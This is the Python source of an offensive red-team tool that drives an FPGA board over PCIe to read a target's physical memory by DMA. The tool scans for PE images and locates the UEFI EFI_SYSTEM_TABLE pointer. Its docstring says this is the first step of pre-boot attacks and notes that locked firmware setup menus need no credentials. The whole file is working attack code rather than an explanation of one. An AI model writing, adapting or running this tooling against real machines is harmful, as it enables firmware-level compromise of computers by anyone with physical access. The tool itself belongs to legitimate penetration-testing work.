#
# PREBOOT
# 
# GuidePoint Security LLC
#
# Threat and Attack Simulation Team
#
import click
import pefile
import struct
import logging
import click_params

from lib import helper
from lib import logger
from lib import static
from lib import pcie_lib
from lib import pcie_lib_helper

#
# Static Scan Values
#
SYSTEM_TABLE_SCAN_FROM = 0xf0000000
SYSTEM_TABLE_SCAN_STEP = 0x10 * static.PAGE_SIZE

#
# PE Header Sizes
#
PE_HDR_SIZE = 0x400

@click.command( name = 'scan', short_help = 'Scans a system for structures needed for preboot attacks.', no_args_is_help = True )
@click.option( '--host', required = True, help = 'IPv4 address of the Spartan-6 SP605.', type = click_params.IPV4_ADDRESS )
@click.option( '--port', help = 'Port of the Spartan-6 SP605', type = int, default = static.DEFAULT_PORT_SP605, show_default = True )
@click.option( '--sys-scan-from', type = helper.click_hex_int, default = f'{hex(SYSTEM_TABLE_SCAN_FROM)}', help = 'Address to start scanning backwards from.', show_default = True )
@click.option( '--sys-scan-step', type = helper.click_hex_int, default = f'{hex(SYSTEM_TABLE_SCAN_STEP)}', help = 'Size in bytes to step backwards each time.', show_default = True )
@click.option( '--debug', help = 'Enable debug output.', default = False, is_flag = True )
def scan( host, port, sys_scan_from, sys_scan_step, debug ):
    """
    Scans a host for critical UEFI structures needed to conduct pre-boot attacks. The
    scanner will hunt for the address of the EFI_SYSTEM_TABLE. To use it properly for
    preboot attacks, pause the boot process at the motherboard setup menu. If it is
    locked, credentials are not needed.

    Prints the pointer for the EFI_SYSTEM_TABLE if it has been located successfully.
    """

    def find_efi_system_table_from_buffer( device : pcie_lib.TransactionLayer, buffer : bytes ) -> int:
        """
        Scans the buffer and attempts to find the EFI_SYSTEM_TABLE address.
        """
        # loop through address size bytes!
        for ptr in range( 0, int( len( buffer ) / 8 ) ):
            # get the pointer
            val = struct.unpack( 'Q', buffer[ ptr * 8 : ptr * 8 + 8 ] )[0]

            # is this a valid address?
            if val > 0x10000000 and val < 0x100000000:
                # Is this the EFI_SYSTEM_TABLE signature?
                if device.mem_read( val, 8 ) == b'\x49\x42\x49\x20\x53\x59\x53\x54':
                    # return the pointer
                    return val

        # no address found
        return None

    def find_efi_system_table_from_pe( device : pcie_lib.TransactionLayer, pe_address : int ) -> int:
        """
        Locates the potential PE's .text and .data sections of memory and sks find_efi_system_table_from_buffer
        to scan the buffer for a potential EFI_SYSTEM_TABLE
        """

        # parse the 'PE!' 
        pe_hdr = device.mem_read( pe_address, PE_HDR_SIZE );
        pe_obj = pefile.PE( data = pe_hdr );

        # parse the PE sections
        for sec in pe_obj.sections:
            if sec.Name.find( b'.data' ) == 0:
                # print the address!
                logging.debug( f'PE .data @ {hex(pe_address + sec.VirtualAddress)}' )

                # read the first part of the sections page.
                pe_sec_buf = device.mem_read( pe_address + sec.VirtualAddress, static.PAGE_SIZE );

                # locate the pointer
                adr = find_efi_system_table_from_buffer( device, pe_sec_buf );

                # did we get an address!?
                if adr != None:
                    return adr

                break

        # parse the PE sections
        for sec in pe_obj.sections:
            if sec.Name.find( b'.text' ) == 0:
                # print the address!
                logging.debug( f'PE .text @ {hex(pe_address + sec.VirtualAddress)}' )

                # read the last part of the sections page
                pe_sec_buf = device.mem_read( pe_address + sec.VirtualAddress + sec.SizeOfRawData - static.PAGE_SIZE, static.PAGE_SIZE );

                # locate the pointer
                adr = find_efi_system_table_from_buffer( device, pe_sec_buf );

                # did we get an address!? 
                if adr != None:
                    return adr

                break

        # return nothing
        return None

    def find_efi_system_table( device : pcie_lib.TransactionLayer, scan_from_addr : int, scan_step_size : int ) -> int:
        """
        Finds the address of the EFI_SYSTEM_TABLE by scanning for arbitrary PE's in memory
        and then asking find_efi_system_table_from_pe() to scan their .text and .rdata sec
        for the pointer.
        """
        ptr = 0

        # loop through until we've scanned the whole memory
        while ptr < scan_from_addr:
            # get the potential 'image' pointer
            img = scan_from_addr - ptr

            try:
                # attempt to read the 'MZ'!
                if device.mem_read( img, 2 ) == b'\x4d\x5a':

                    # log that found a PE?!
                    logging.debug( f'Potential PE @ {hex(img)}' );

                    # potential PE image!
                    adr = find_efi_system_table_from_pe( device, img );

                    # success?! 
                    if adr != None:
                        return adr

                # increment the pointer
                ptr = ptr + scan_step_size
            except pcie_lib.TransactionLayer.ErrorBadCompletion:
                # incremente the pointer
                ptr = ptr + 0x800000

        # nothing to return
        return None


    # Initialize the logger for the debug options needed
    logger.init_log( debug )

    # wait until we are linked properly
    dev = pcie_lib_helper.wait_for_endpoint_init( ( str( host ), port ) )

    if dev != None:
        # find the EFI_SYSTEM_TABLE address
        ptr = find_efi_system_table( dev, sys_scan_from, sys_scan_step );

        # did we get it?!
        if ptr != None:
            logging.info( f'EFI_SYSTEM_TABLE address @ {hex(ptr)}' )
        else:
            logging.error( 'Could not find the EFI_SYSTEM_TABLE address' )
    else:
        logging.error( 'Could not initialize the PCIe device.' );
